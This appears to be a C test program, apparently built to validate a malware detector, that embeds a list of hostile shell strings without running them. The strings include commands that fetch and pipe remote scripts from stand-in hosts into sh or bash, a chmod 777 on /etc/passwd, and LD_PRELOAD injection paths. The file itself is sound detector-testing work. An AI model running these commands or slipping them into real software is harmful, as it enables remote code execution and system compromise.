#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Embed many suspicious strings to push the ML score upward without executing them. */
static const char *suspicious_strings[] = {
    "/tmp/dropper.sh",
    "/tmp/payload.bin",
    "/dev/shm/winncore_persist",
    "wget http://malicious.example/payload",
    "curl -k http://bad.example/exec",
    "/bin/sh -c /tmp/dropper.sh",
    "chmod +x /tmp/drop",
    "LD_PRELOAD=/tmp/libinject.so",
    "setuid(0)",
    "ptrace(PTRACE_TRACEME)",
    "execve(/bin/sh)",
    "sh -c chmod 777 /etc/passwd",
    "curl -fsSL http://a.example/run | sh",
    "wget -qO- http://b.example/p | bash",
    "ptrace",
    "LD_PRELOAD",
    "setuid",
};

static volatile unsigned sink = 0;

static void touch_strings(void) {
    for (size_t i = 0; i < sizeof(suspicious_strings) / sizeof(suspicious_strings[0]); i++) {
        /* Prevent optimization: sum lengths into a volatile sink */
        sink += (unsigned)strlen(suspicious_strings[i]);
    }
}

int main(void) {
    puts("simulated malicious behavior for detector validation");
    touch_strings();
    if (getenv("DONT_RUN")) {
        for (size_t i = 0; i < sizeof(suspicious_strings) / sizeof(suspicious_strings[0]); i++) {
            printf("s: %s\n", suspicious_strings[i]);
        }
    }
    return (int)sink & 0xFF; /* keep non-zeroish return for variability */
}
